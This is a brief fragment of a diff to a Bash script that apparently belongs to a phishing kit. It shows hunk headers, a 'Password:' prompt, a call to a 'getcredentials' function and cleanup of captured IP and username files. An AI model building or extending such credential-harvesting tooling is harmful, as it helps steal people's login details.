...
createpage() {
@@ -260,7 +272,11 @@ printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77
...
@@ -366,6 +382,51 @@ rm -rf iptracker.log
getcredentials
}
...
if [[ -e sites/$server/ip.txt ]]; then
rm -rf sites/$server/ip.txt
@@ -376,19 +437,77 @@ rm -rf sites/$server/usernames.txt
